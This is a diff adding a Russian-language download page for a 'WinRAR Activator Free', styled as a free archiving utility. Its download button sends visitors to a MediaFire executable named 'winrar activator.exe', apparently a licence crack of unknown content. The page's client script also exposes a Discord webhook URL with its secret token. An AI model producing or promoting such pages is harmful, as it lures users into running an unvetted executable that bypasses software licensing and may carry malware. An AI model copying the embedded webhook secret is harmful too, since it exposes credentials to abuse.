@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Winrar activator</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            background: #0a1a2a;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .container {
+            text-align: center;
+            position: relative;
+            z-index: 2;
+        }
+
+        h1 {
+            color: #f5f5f5;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: #ccc;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+
+        .download-btn {
+            background: linear-gradient(135deg, #1a2b3c, #0f2027);
+            color: #f5f5f5;
+            padding: 15px 40px;
+            border: 2px solid #f5f5f5;
+            border-radius: 5px;
+            font-size: 20px;
+            cursor: pointer;
+            box-shadow: 0 0 10px rgba(245, 245, 245, 0.3);
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.2s, box-shadow 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .download-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.2) 10%, transparent 70%);
+            opacity: 0.3;
+            z-index: 0;
+        }
+
+        .download-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px rgba(245, 245, 245, 0.5);
+        }
+
+        .download-btn:active {
+            transform: scale(0.95);
+        }
+
+        .download-btn span {
+            position: relative;
+            z-index: 1;
+        }
+
+        .loading-icon {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #f5f5f5;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-left: 10px;
+            z-index: 1;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            color: #f5f5f5;
+            font-size: 14px;
+            text-decoration: underline;
+            z-index: 2;
+        }
+
+        .report-link {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            color: #87CEFA;
+            font-size: 14px;
+            text-decoration: underline;
+            cursor: pointer;
+            z-index: 2;
+        }
+
+        .report-modal, .modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0.9);
+            background: #1a2b3c;
+            padding: 20px;
+            border: 2px solid #f5f5f5;
+            border-radius: 5px;
+            color: #f5f5f5;
+            z-index: 5;
+            width: 300px;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+
+        .report-modal.active, .modal.active {
+            opacity: 1;
+            transform: translate(-50%, -50%) scale(1);
+            visibility: visible;
+        }
+
+        .report-modal textarea {
+            width: 100%;
+            height: 100px;
+            margin-bottom: 10px;
+            background: #0f2027;
+            color: #f5f5f5;
+            border: 1px solid #f5f5f5;
+            border-radius: 3px;
+            padding: 5px;
+            resize: none;
+        }
+
+        .report-modal button {
+            background: #1a2b3c;
+            color: #f5f5f5;
+            border: 2px solid #f5f5f5;
+            padding: 5px 15px;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+
+        .report-modal button:hover {
+            box-shadow: 0 0 10px rgba(245, 245, 245, 0.5);
+        }
+
+        .modal p {
+            margin: 10px 0;
+        }
+
+        .info-btn {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: #1a2b3c;
+            color: #f5f5f5;
+            padding: 8px 16px;
+            border: 2px solid #f5f5f5;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            z-index: 3;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .info-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 10px rgba(245, 245, 245, 0.5);
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            width: 20px;
+            height: 20px;
+            background: linear-gradient(135deg, #1a2b3c, #0f2027); /* Градиент как у кнопок */
+            color: #f5f5f5;
+            font-size: 16px;
+            line-height: 20px;
+            text-align: center;
+            cursor: pointer;
+            border: 1px solid #f5f5f5; /* Белая рамка */
+            border-radius: 3px;
+            transition: box-shadow 0.2s;
+        }
+
+        .close-btn:hover {
+            box-shadow: 0 0 5px rgba(245, 245, 245, 0.5);
+        }
+
+        .bg-animation {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to bottom, #0a1a2a, #1a2b3c);
+            z-index: 1;
+        }
+
+        .moon {
+            position: absolute;
+            top: 50px;
+            left: 50px;
+            width: 120px;
+            height: 120px;
+            background: radial-gradient(circle at 70% 70%, #d3d3d3 10%, #a9a9a9 30%, #808080 60%, transparent 70%);
+            border-radius: 50%;
+            box-shadow: 0 0 30px rgba(211, 211, 211, 0.5);
+            z-index: 1;
+        }
+
+        .moon::before {
+            content: '';
+            position: absolute;
+            top: 20px;
+            left: 30px;
+            width: 30px;
+            height: 30px;
+            background: #808080;
+            border-radius: 50%;
+            opacity: 0.5;
+        }
+
+        .moon::after {
+            content: '';
+            position: absolute;
+            top: 60px;
+            left: 50px;
+            width: 20px;
+            height: 20px;
+            background: #808080;
+            border-radius: 50%;
+            opacity: 0.5;
+        }
+
+        .stars {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            z-index: 1;
+        }
+
+        .stars::before, .stars::after, .stars-layer-2::before, .stars-layer-2::after {
+            content: '';
+            position: absolute;
+            width: 2px;
+            height: 2px;
+            background: white;
+            border-radius: 50%;
+            box-shadow: 
+                50px 50px 0 0 white,
+                150px 200px 0 0 white,
+                300px 100px 0 0 white,
+                400px 300px 0 0 white,
+                600px 150px 0 0 white,
+                700px 400px 0 0 white,
+                900px 50px 0 0 white,
+                1000px 250px 0 0 white,
+                1200px 350px 0 0 white,
+                1300px 100px 0 0 white,
+                200px 500px 0 0 white,
+                350px 600px 0 0 white,
+                450px 200px 0 0 white,
+                550px 400px 0 0 white,
+                650px 300px 0 0 white,
+                750px 150px 0 0 white,
+                850px 450px 0 0 white,
+                950px 250px 0 0 white,
+                1050px 350px 0 0 white,
+                1150px 200px 0 0 white;
+            animation: twinkle 3s infinite;
+        }
+
+        .stars::after {
+            box-shadow: 
+                200px 300px 0 0 white,
+                350px 150px 0 0 white,
+                500px 400px 0 0 white,
+                650px 50px 0 0 white,
+                800px 200px 0 0 white,
+                950px 300px 0 0 white,
+                1100px 100px 0 0 white,
+                1250px 250px 0 0 white,
+                1400px 350px 0 0 white,
+                1500px 150px 0 0 white,
+                100px 600px 0 0 white,
+                250px 450px 0 0 white,
+                400px 550px 0 0 white,
+                550px 350px 0 0 white,
+                700px 250px 0 0 white,
+                850px 400px 0 0 white,
+                1000px 500px 0 0 white,
+                1150px 300px 0 0 white,
+                1300px 450px 0 0 white,
+                1450px 200px 0 0 white;
+            animation-delay: 1.5s;
+        }
+
+        .stars-layer-2::before {
+            box-shadow: 
+                80px 120px 0 0 white,
+                220px 280px 0 0 white,
+                360px 160px 0 0 white,
+                480px 320px 0 0 white,
+                620px 200px 0 0 white,
+                760px 440px 0 0 white,
+                880px 80px 0 0 white,
+                1020px 260px 0 0 white,
+                1160px 380px 0 0 white,
+                1320px 140px 0 0 white,
+                140px 520px 0 0 white,
+                280px 640px 0 0 white,
+                420px 240px 0 0 white,
+                560px 420px 0 0 white,
+                700px 340px 0 0 white,
+                840px 180px 0 0 white,
+                980px 460px 0 0 white,
+                1120px 280px 0 0 white,
+                1260px 360px 0 0 white,
+                1400px 220px 0 0 white;
+            animation-delay: 0.5s;
+        }
+
+        .stars-layer-2::after {
+            box-shadow: 
+                120px 340px 0 0 white,
+                260px 180px 0 0 white,
+                400px 420px 0 0 white,
+                540px 80px 0 0 white,
+                680px 240px 0 0 white,
+                820px 320px 0 0 white,
+                960px 140px 0 0 white,
+                1100px 260px 0 0 white,
+                1240px 380px 0 0 white,
+                1380px 160px 0 0 white,
+                160px 560px 0 0 white,
+                300px 480px 0 0 white,
+                440px 600px 0 0 white,
+                580px 360px 0 0 white,
+                720px 280px 0 0 white,
+                860px 420px 0 0 white,
+                1000px 540px 0 0 white,
+                1140px 320px 0 0 white,
+                1280px 480px 0 0 white,
+                1420px 240px 0 0 white;
+            animation-delay: 2s;
+        }
+
+        @keyframes twinkle {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .falling-star {
+            position: absolute;
+            width: 2px;
+            height: 2px;
+            background: white;
+            border-radius: 50%;
+            box-shadow: 0 0 5px white;
+        }
+
+        @keyframes fall {
+            0% {
+                transform: translate(0, 0);
+                opacity: 1;
+            }
+            100% {
+                transform: translate(300px, 500px);
+                opacity: 0;
+            }
+        }
+
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 20px;
+            }
+            p {
+                font-size: 14px;
+            }
+            .download-btn {
+                padding: 10px 20px;
+                font-size: 16px;
+            }
+            .moon {
+                width: 60px;
+                height: 60px;
+                top: 10px;
+                left: 10px;
+            }
+            .modal, .report-modal {
+                width: 80%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-animation">
+        <div class="moon"></div>
+        <div class="stars">
+            <div class="falling-star"></div>
+            <div class="falling-star"></div>
+            <div class="falling-star"></div>
+            <div class="falling-star"></div>
+            <div class="falling-star"></div>
+            <div class="falling-star"></div>
+            <div class="falling-star"></div>
+            <div class="falling-star"></div>
+        </div>
+        <div class="stars-layer-2">
+            <div class="falling-star"></div>
+            <div class="falling-star"></div>
+            <div class="falling-star"></div>
+            <div class="falling-star"></div>
+        </div>
+    </div>
+    <div class="container">
+        <h1>WinRAR Активатор Free</h1>
+        <p>Бесплатная утилита для архивации файлов</p>
+        <button class="download-btn" onclick="startDownload()">
+            <span>⬇ Скачать</span>
+            <span class="loading-icon"></span>
+        </button>
+    </div>
+    <div class="footer">by aloha V2</div>
+    <button class="info-btn" onclick="document.querySelector('.modal').classList.add('active')">Info</button>
+    <div class="modal">
+        <div class="close-btn" onclick="document.querySelector('.modal').classList.remove('active')">✖</div>
+        <p>Создатель: aloha V2</p>
+        <p>Дата создания: 29.03.2025</p>
+        <p>Размер файла: 10.4 МБ</p>
+    </div>
+    <div class="report-link" onclick="document.querySelector('.report-modal').classList.add('active')">Сообщить о проблеме</div>
+    <div class="report-modal">
+        <div class="close-btn" onclick="document.querySelector('.report-modal').classList.remove('active')">✖</div>
+        <textarea id="report-text" placeholder="Опишите проблему..."></textarea>
+        <button onclick="sendReport()">Отправить</button>
+    </div>
+
+    <script>
+        // Загрузка с иконкой
+        function startDownload() {
+            const loadingIcon = document.querySelector('.loading-icon');
+            loadingIcon.style.display = 'inline-block';
+            window.location.href = 'https://download1072.mediafire.com/ole5ct0ex45gTZGyBrDgZWvAYk0zsdxVRuWRHO15w6Bj9oAWbbCoqYVoU-Ch0dYdQ5Zr8KWKgGhoxVjMUrA5Rl5DrdgYV_7iuoEzGV4NmBSb1zasdRQg7iK96XQPkNhfZTZ0MuQJYobbIHsHRQB6DQCuTRAuIpKKonVTp6RNJQ5saKS4/55zb5ohcggsew5f/winrar+activator.exe';
+            setTimeout(() => {
+                loadingIcon.style.display = 'none';
+            }, 5000);
+        }
+
+        // Закрытие модальных окон по клику вне
+        document.addEventListener('click', function(e) {
+            const infoModal = document.querySelector('.modal');
+            const reportModal = document.querySelector('.report-modal');
+            if (infoModal.classList.contains('active') && !infoModal.contains(e.target) && e.target !== document.querySelector('.info-btn')) {
+                infoModal.classList.remove('active');
+            }
+            if (reportModal.classList.contains('active') && !reportModal.contains(e.target) && e.target !== document.querySelector('.report-link')) {
+                reportModal.classList.remove('active');
+            }
+        });
+
+        // Отправка отчёта в Discord через вебхук
+        function sendReport() {
+            const reportText = document.getElementById('report-text').value;
+            if (reportText.trim() === '') {
+                alert('Пожалуйста, введите описание проблемы.');
+                return;
+            }
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1355639822244511835/glIbCjZUjjFYIqpW6Mztoq8IuhKOyWA0k8RINR2afnUJsjWRQnp5IOVeHLmbgCq_Je3E';
+            const payload = {
+                content: `**Новая проблема:**\n${reportText}`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Проблема успешно отправлена!');
+                    document.getElementById('report-text').value = '';
+                    document.querySelector('.report-modal').classList.remove('active');
+                } else {
+                    alert('Ошибка при отправке. Попробуйте позже.');
+                }
+            })
+            .catch(error => {
+                console.error('Ошибка:', error);
+                alert('Ошибка при отправке. Проверьте подключение.');
+            });
+        }
+
+        // Случайные падающие звёзды
+        const fallingStars = document.querySelectorAll('.falling-star');
+        fallingStars.forEach(star => {
+            const startX = Math.random() * window.innerWidth;
+            const startY = Math.random() * window.innerHeight * 0.3;
+            const duration = Math.random() * 2 + 1;
+            const delay = Math.random() * 2;
+
+            star.style.left = `${startX}px`;
+            star.style.top = `${startY}px`;
+            star.style.animation = `fall ${duration}s linear infinite`;
+            star.style.animationDelay = `${delay}s`;
+        });
+    </script>
+</body>
+</html>
